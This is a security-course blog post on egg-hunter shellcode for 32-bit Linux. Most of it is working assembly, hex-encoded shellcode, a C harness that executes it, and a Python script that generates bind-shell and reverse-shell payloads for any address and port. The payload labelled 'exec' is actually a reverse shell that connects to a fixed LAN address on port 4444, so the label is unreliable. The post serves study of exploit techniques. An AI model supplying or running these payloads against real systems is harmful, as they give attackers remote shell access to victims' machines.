# Assignment #3: Egg Hunter Shellcode 

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-858


### Exercise
- Study about the egg hunter shellcode
- Create a working demo of the Egghunter
- Should be configurable for different payloads


### Solution

First, What is an EggHunter shellcode?

A EggHunter is a little program that It is used to find a "pattern". In our case of study, our egghunter look for the *pattern* because after is the *shellcode*. It is very important and useful when we don't know where is the shellcode. So the egghunter program will look in all the memory position to find the "EGG" and run the shellcode.


Exists multiple ways to do an egghunter shellcode, but the best way is read all the memory position to find it. 


```nasm
global _start

_start:

align_page:
    or cx,0xfff         ; page alignment


next_address:
    inc ecx
    push byte +0x43     ; sigaction(2)
    pop eax             
    int 0x80            
    cmp al,0xf2         ; EFAULT?
    jz align_page       
    mov eax, 0x50905090 
    mov edi, ecx        
    scasd               
    jnz next_address    
    scasd               
    jnz next_address    
    jmp edi  
```

It is a very good way to read all memory positions, this egghunter shellcode was described in the Skape paper about the EggHunter. In this program, every memory position is read using the syscall sigaction, when the code EFAULT is returned means that the position is invalid and when it happens we aling the page, but when the position is OK we check the content of these position and compare with our EGG. If the egg is inside the position, our shellcode is 8-bytes after. So we jump to the 8-byte after position where we found the EGG.


#### Demo

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment3$ nasm -f elf32 egg-hunter.nasm -o egg-hunter.o
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment3$ ld egg-hunter.o -o egg-hunter
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment3$ objdump -d ./egg-hunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7"
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment3$ cat shellcode.c 
#include<stdio.h>
#include<string.h>

#define EGG "\x90\x50\x90\x50"

unsigned char egg_hunter[] = \
"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

unsigned char code[] = 
EGG
EGG 
"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc9\x68\xc0\xa8\x01\x40\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x89\xf3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Egg hunter Length: %d\n", strlen(egg_hunter));
	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())egg_hunter;

	ret();

}
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment3$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment3$ ./shellcode 
Egg hunter Length: 30
Shellcode Length:  94
$ id
uid=1000(hiro) gid=1000(hiro) groups=1000(hiro),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner)
$
``` 


#### Configurable for different payloads

I made a simple script that it generate an egghunter shellcode with different payloads like exec, bind and reverse:

```python
#!/usr/bin/env python

import sys
import struct
import os
import binascii
import socket
from optparse import OptionParser, OptionGroup

shellcode_l = {
	'exec':"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc9\x68\xc0\xa8\x01\x40\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x89\xf3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80",
	'reverse':"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc9\x68ADDRESS\x66\x68PORT\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x89\xf3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80",
	'bind':"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc0\x31\xc9\x50\x66\x68PORT\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x31\xc0\x50\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x56\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
}

def eggHunter(egg):
	egghunter = "\\x66\\x81\\xc9\\xff\\x0f\\x41\\x6a\\x43\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xf1\\xb8%s\\x89\\xcf\\xaf\\x75\\xec\\xaf\\x75\\xe9\\xff\\xe7"%getEgg(egg)
	return egghunter

def port2hex(port):
	return struct.pack(">H", port)


def address2hex(address):
	addr = binascii.hexlify(socket.inet_aton(address))
	return binascii.unhexlify("".join([addr[i:i+2] for i in range(0, len(addr), 2)]))
	

def getEgg(eggi):
        egg = ""
        for c in range(0, 8, 2):
                egg += "\\x%s%s" % (eggi[c], eggi[c+1])
	return egg

def nullBytes(cad):
        check = [cad.encode('hex')[i:i+2] for i in range(0, len(cad.encode('hex')), 2)]
        for i in check:
                if (i == "00"):
                        print "[-] The payload contains null bytes :("


def reversePayload(egg, address, port):
	port = port2hex(int(port))
	nullBytes(port)
	address = address2hex(address)
	nullBytes(address)
	shellcode = shellcode_l["reverse"]
	shellcode_o = shellcode.replace("PORT", port).replace("ADDRESS", address)
        sc = ""
        for c in bytearray(shellcode_o):
                sc += "\\x%02x" % c
        skeleton(egg, sc)


def bindPayload(egg, port):
	port = port2hex(int(port))
	port_check = [port.encode('hex')[i:i+2] for i in range(0, len(port.encode('hex')), 2)]
	nullBytes(port)
        shellcode = shellcode_l["bind"]
	shellcode_o = shellcode.replace("PORT", port)
        sc = ""
        for c in bytearray(shellcode_o):
                sc += "\\x%02x" % c
        skeleton(egg, sc)



def execPayload(egg):
	shellcode = shellcode_l["exec"]
	sc = ""
	for c in bytearray(shellcode):
		sc += "\\x%02x" % c
	skeleton(egg, sc)


def skeleton(egg, shellcode):
	shellcode_c = '#include<stdio.h>\n\
#include<string.h>\n\
#define EGG "%s"\n\
unsigned char egg_hunter[] = "%s";\n\
unsigned char code[] = \n\
EGG\n\
EGG\n\
"%s";\n\
main(){\n\
printf("Egg hunter Length: %%d\\n", strlen(egg_hunter));\n\
printf("Shellcode Length: %%d\\n", strlen(code));\n\
int (*ret)() = (int(*)())code;\n\
ret();\n\
}'%(getEgg(egg),eggHunter(egg),shellcode)
        print shellcode_c



def opciones():
        parser = OptionParser("usage: %prog [options] \nExample: ./%prog -e 50905090 -p exec")
        parser.add_option("-e", "--egghunter",
                  action="store", type="string", dest="egghunter", help="Egghunter pattern")
        parser.add_option("-p", "--payload",
                  action="store", type="string", dest="payload", help="Payload (exec, bind, reverse)")
        parser.add_option("-x", "--port",
                  action="store", type="string", dest="port", help="Port (bind or reverse payload)")
        parser.add_option("-a", "--address",
                  action="store", type="string", dest="address", help="Address (reverse payload)")
        (options, args) = parser.parse_args()
        if (len(sys.argv) == 1):
            parser.print_help()
        elif (options.egghunter is not None) and (options.payload is not None):
		if (options.payload == "exec"):
			execPayload(options.egghunter)
		elif (options.payload == "bind"):
			if (options.port is not None):
				bindPayload(options.egghunter, options.port)
			else:
				print "[-] Bindi shellcode needs a port"
				
		elif (options.payload == "reverse"):
			if (options.port is not None) and (options.address is not None):
				reversePayload(options.egghunter, options.address, options.port)
			else:
				print "[-] Reverse shellcode needs port and address"
		else:
			print "[-] Payload not valid"
	else:
		print "[-] Need egghunter and payload"


if __name__ == "__main__":
	opciones()
```

Example:

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment3$ ./egghunter.py -e 90509050 -p bind -x 4444 
#include<stdio.h>
#include<string.h>
#define EGG "\x90\x50\x90\x50"
unsigned char egg_hunter[] = "\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";
unsigned char code[] = 
EGG
EGG
"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc0\x31\xc9\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x31\xc0\x50\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x56\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
main(){
printf("Egg hunter Length: %d\n", strlen(egg_hunter));
printf("Shellcode Length: %d\n", strlen(code));
int (*ret)() = (int(*)())code;
ret();
}
```
